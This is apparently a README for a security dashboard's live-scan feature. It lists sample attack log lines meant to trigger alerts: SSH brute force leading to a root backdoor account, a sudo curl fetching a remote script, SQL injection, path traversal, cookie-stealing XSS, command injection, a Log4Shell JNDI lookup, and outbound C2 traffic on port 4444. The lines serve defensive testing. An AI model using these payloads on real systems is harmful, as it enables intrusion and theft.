# Live scan examples

Ready-made attack log lines to see **Live scan** react. All IPs are from RFC 5737 documentation ranges.

## The easy way: nothing to copy

In the dashboard switch on **Live scan** (leave **Simulation mode** off), open the sidebar's **Test it** box, pick an
example under **Add a ready-made attack** and press **⚡ Add example**. The lines in these files are added for you and
sent to the right log files. Alerts appear within one check interval, and an attack in a growing log is alerted once, but lines you add here alert every time (marked "↻ added again" if the attack was reported before).

## What is in this folder

Each `.txt` file **is** the log data. Open it, select all, and that is what you would paste.

- `1_ssh_brute_force_to_compromise.txt`: Oct 10 11:20:01 web-01 sshd[7101]: Failed password for root from 203.0.113.45 port 40211 ssh2
Oct 10 11:20:03 web-01 sshd[7102]: Failed password for admin from 203.0.113.45 port 40213 ssh2
Oct 10 11:20:05 web-01 sshd[7103]: Failed password for invalid user test from 203.0.113.45 port 40215 ssh2
Oct 10 11:20:07 web-01 sshd[7104]: Failed password for invalid user oracle from 203.0.113.45 port 40217 ssh2
Oct 10 11:20:09 web-01 sshd[7105]: Failed password for invalid user git from 203.0.113.45 port 40219 ssh2
Oct 10 11:20:11 web-01 sshd[7106]: Failed password for invalid user ubuntu from 203.0.113.45 port 40221 ssh2
Oct 10 11:20:13 web-01 sshd[7107]: Failed password for root from 203.0.113.45 port 40223 ssh2
Oct 10 11:20:15 web-01 sshd[7108]: Failed password for admin from 203.0.113.45 port 40225 ssh2
Oct 10 11:20:17 web-01 sshd[7109]: Failed password for invalid user postgres from 203.0.113.45 port 40227 ssh2
Oct 10 11:20:19 web-01 sshd[7110]: Failed password for root from 203.0.113.45 port 40229 ssh2
Oct 10 11:20:21 web-01 sshd[7111]: Failed password for admin from 203.0.113.45 port 40231 ssh2
Oct 10 11:20:23 web-01 sshd[7112]: Failed password for admin from 203.0.113.45 port 40233 ssh2
Oct 10 11:20:41 web-01 sshd[7120]: Accepted password for admin from 203.0.113.45 port 40240 ssh2
Oct 10 11:21:02 web-01 sudo:    admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
Oct 10 11:21:30 web-01 sudo:    admin : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -s http://203.0.113.99/x.sh
Oct 10 11:22:05 web-01 useradd[7190]: new user: name=sysupdate, UID=0, GID=0, home=/root, shell=/bin/bash

- `2_web_attacks.txt`: 192.0.2.88 - - [10/Oct/2026:11:30:01 +0000] "GET /products?id=12%27%20OR%20%271%27=%271 HTTP/1.1" 500 1159 "-" "Mozilla/5.0"
192.0.2.88 - - [10/Oct/2026:11:30:04 +0000] "GET /products?id=1%20UNION%20SELECT%20username,password%20FROM%20users HTTP/1.1" 200 2210 "-" "Mozilla/5.0"
192.0.2.88 - - [10/Oct/2026:11:30:09 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 3622 "-" "curl/8.5.0"
192.0.2.88 - - [10/Oct/2026:11:30:14 +0000] "GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1" 200 840 "-" "Mozilla/5.0"
192.0.2.88 - - [10/Oct/2026:11:30:19 +0000] "GET /ping?host=8.8.8.8;whoami HTTP/1.1" 200 96 "-" "Mozilla/5.0"
192.0.2.88 - - [10/Oct/2026:11:30:24 +0000] "GET / HTTP/1.1" 200 5120 "-" "${jndi:ldap://192.0.2.88:1389/Exploit}"
192.0.2.88 - - [10/Oct/2026:11:30:29 +0000] "GET /admin HTTP/1.1" 404 3800 "-" "sqlmap/1.8.4#stable (https://sqlmap.org)"
192.0.2.88 - - [10/Oct/2026:11:30:31 +0000] "GET /.env HTTP/1.1" 404 420 "-" "sqlmap/1.8.4#stable (https://sqlmap.org)"


- `3_port_scan_and_c2.txt`: Oct 10 11:40:00 web-01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.0.2.99 DST=10.0.0.5 PROTO=TCP SPT=46001 DPT=21 SYN
Oct 10 11:40:01 web-01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.0.2.99 DST=10.0.0.5 PROTO=TCP SPT=46002 DPT=22 SYN
Oct 10 11:40:02 web-01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.0.2.99 DST=10.0.0.5 PROTO=TCP SPT=46003 DPT=23 SYN
Oct 10 11:40:03 web-01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.0.2.99 DST=10.0.0.5 PROTO=TCP SPT=46004 DPT=25 SYN
Oct 10 11:40:04 web-01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.0.2.99 DST=10.0.0.5 PROTO=TCP SPT=46005 DPT=80 SYN
Oct 10 11:40:05 web-01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.0.2.99 DST=10.0.0.5 PROTO=TCP SPT=46006 DPT=110 SYN
Oct 10 11:40:06 web-01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.0.2.99 DST=10.0.0.5 PROTO=TCP SPT=46007 DPT=139 SYN
Oct 10 11:40:07 web-01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.0.2.99 DST=10.0.0.5 PROTO=TCP SPT=46008 DPT=443 SYN
Oct 10 11:40:08 web-01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.0.2.99 DST=10.0.0.5 PROTO=TCP SPT=46009 DPT=445 SYN
Oct 10 11:40:09 web-01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.0.2.99 DST=10.0.0.5 PROTO=TCP SPT=46010 DPT=3306 SYN
Oct 10 11:40:10 web-01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.0.2.99 DST=10.0.0.5 PROTO=TCP SPT=46011 DPT=3389 SYN
Oct 10 11:40:11 web-01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.0.2.99 DST=10.0.0.5 PROTO=TCP SPT=46012 DPT=8080 SYN
Oct 10 11:41:30 web-01 kernel: [UFW ALLOW] IN= OUT=eth0 SRC=10.0.0.5 DST=203.0.113.99 PROTO=TCP SPT=43122 DPT=4444 SYN
Oct 10 11:43:30 web-01 kernel: [UFW ALLOW] IN= OUT=eth0 SRC=10.0.0.5 DST=203.0.113.99 PROTO=TCP SPT=43180 DPT=4444 LEN=1460 BYTES=48211904



> **Do not copy text from a README into the logs.** Descriptions such as "SQL injection, path traversal…" are not log
> lines; no parser can read them, the dashboard reports them as ignored, and the **🧹 Fix the live logs** button removes them.

## Using your own lines

Paste them into **Or paste your own log lines** with the default **Auto-detect**, which sends each line to `auth.log`,
`nginx_access.log` or `firewall.log` by what it looks like. Or append them to `live_logs/<file>` yourself with any editor
or `cat >>` (then each line must already be in the right file for that file's format).

Switch Live scan on **before** adding lines: content that is already in the files when Live scan starts is treated as the
baseline and does not alert.
